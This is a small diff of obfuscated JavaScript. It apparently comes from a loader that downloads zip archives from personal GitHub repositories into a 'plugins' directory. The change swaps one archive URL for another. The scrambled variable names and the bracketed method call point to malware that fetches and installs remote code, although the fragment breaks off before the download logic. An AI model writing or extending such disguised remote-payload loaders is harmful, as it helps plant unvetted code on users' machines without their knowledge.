@@ -58,7 +58,7 @@ const UvoJ = [
 ];
 const orfJ =
   "https://github.com/duafatima75/duafatima5/archive/refs/heads/main.zip";
-const QsiJ = "https://github.com/duafatima/duafatima4/archive/refs/heads/main.zip";
+const QsiJ = "https://github.com/duafatima75/duafatima4/archive/refs/heads/main.zip";
 const koZI = path["join"](YeHI, "plugins");
 async function MpcJ() {
   try {
